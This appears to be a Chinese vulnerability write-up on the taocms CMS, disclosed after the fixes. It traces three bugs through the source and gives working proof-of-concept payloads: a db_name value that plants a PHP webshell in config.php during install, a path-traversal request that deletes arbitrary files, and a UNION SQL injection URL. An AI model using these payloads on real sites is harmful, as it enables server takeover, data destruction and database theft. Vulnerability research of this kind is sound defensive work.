### install/getshell

直接看`/install.php#24`

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ce77079d4e8c1917347e1a91c6ce430340095621.png)

判断是否有POST传入db\_name，如果有的话就会赋值给$db\_name参数，如果没有就会赋值默认的值，跟进  
`/config.php#16`

```php
define('DB_NAME',   'data/blog.db');
```

回到install.php，接着需要往下找到将POST传入的值重新覆盖传回到config.php的代码，在文件中接着搜索，在234行

```php
$configs=file_get_contents('config.php');
$_POST['tb']&&$configs=str_replace('define(\'TB\',  \''.TB.'\');','define(\'TB\',   \''.$_POST['tb'].'\');',$configs);
$_POST['db']&&$configs=str_replace('define(\'DB\',  \''.DB.'\');','define(\'DB\',   \''.$_POST['db'].'\');',$configs);
$_POST['db_name']&&$configs=str_replace('define(\'DB_NAME\',    \''.DB_NAME.'\');','define(\'DB_NAME\', \''.$_POST['db_name'].'\');',$configs);
file_put_contents('config.php',$configs);
file_put_contents('data/install.lock','');
```

可以看到这里先调用file\_get\_contents读取了配置文件当中的内容，接着调用了str\_replace将默认值替换成了POST中传入的参数值，这里其实三个参数都能够写入shell文件，这里对`db_name`进行写入shell;除此之外这里还会在data文件夹下生成install.lock锁文件，作为是否安装过的判断条件  
很容易就得到了poc，只需要进行闭合符号，再插入shell就可以了

```php
db_name=|127.0.0.1:3306|root|123456|taocms|');assert($_REQUEST['cmd']);//
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-84c64f548fa0e773634a8c60fffdb80076102c68.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1c09d520ca03095a8bee3ac9a0f39b66fe491dab.png)

### Delete any file

先给出poc

```php
?action=file&ctrl=del&path=filepath
```

`admin/admin.php#17`  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-32a77d2934cadce58f7a8f5f9e0c95d6b03a9f2e.png)

先会调用`Base`类中的`catauth`方法对`$action`参数进行判断，之后会判断是否存在相应的类，如果存在的话就实例化该类并赋值给`$model`，并且会判断`$ctrl`方法是否存在于`$action`类中，存在的话就会调用类中无参方法

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2d38697f76db1bd8c71895aa067c9c797a6938c2.png)  
`include/Model/Base.php#119`,通过调试发现`$_SESSION[TB.'admin_level']=admin`，所以返回值为true恒成立，所以上面的代码逻辑会接着往下走  
根据poc，继续来跟代码  
传入的`$action=file`,定位到类文件`include/Model/File.php`

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4dab37e82445a5879f7f548245288cd4d5cab299.png)

根据File类的构造方法，以及前面传入的参数，`$id`是可控的，但是没有赋值默认为0，`$table`即是`$action=file`,接着这里会对指定文件的真实路径进行拼接，这里的`SYS_ROOT`就是整个项目的绝对磁盘路径，这里是`D:/phpStudy/WWW/`  
往下看到调用的del方法

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f02659122f5c5fc1705bb4436a96113eb32905e4.png)

这里会对指定绝对路径要删除的文件的全选进行判断，并且如果是文件夹的话会遍历文件夹并判断文件夹是否为空，之后就会直接进行删除的操作，加上目录穿越就可以进行任意文件删除了。任意文件删除复现不好截图，就不放了。

### SQL Injection

poc

```php
?name=-1%"+union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()%23&cat=0&status=&action=cms&ctrl=lists&submit=%E6%9F%A5%E8%AF%A2
```

根据poc来进行分析  
`include\Model\Cms.php#112`

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-35e0c18d0e233d8834cb2c938f2787c58f179bcc.png)

`name,cat,status`三个参数都由GET传入，都可控，直接来看调用的DB类中的getlist方法  
`include/Db/Mysql.php#60`

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-74eecfb729d1aadbf05002ab551baed7caf41902.png)

调用的方法除了前三个参数是由前面调用时传入的参数覆盖的，其他两个参数为默认值，调试输出了最后的sql查询语句

```php
select count(*) from cms_cms where 1=1  and name like "%-1%" union select group_concat(table_name) from information_schema.tables where table_schema=database()#%" ORDER BY  id DESC  limit 20
```

这里sql执行完之后会调用`Base`类中的`magic2word`方法，对结果是否为数组进行判断，如果是数组就会存入新的数组并且返回赋值给`$datas`数组，打印该数组可以发现注入的语句已经成功执行并返回了结果

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-34eb91df50570bef016799bb38cbb54c03696536.png)

之后就可以修改语句进行爆字段值等操作了，由于这里本身是不会有返回结果的，所以需要进行盲注脚本碰撞或者用sqlmap才能够进行利用,还有别处sql注入就不一一分析了。  
备注：上述漏洞均已在最新版修复，在github相应的issue下cms作者已作出回复。  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3af38923fe54c6ac669d1f808e9b2ea2caf3ca44.png)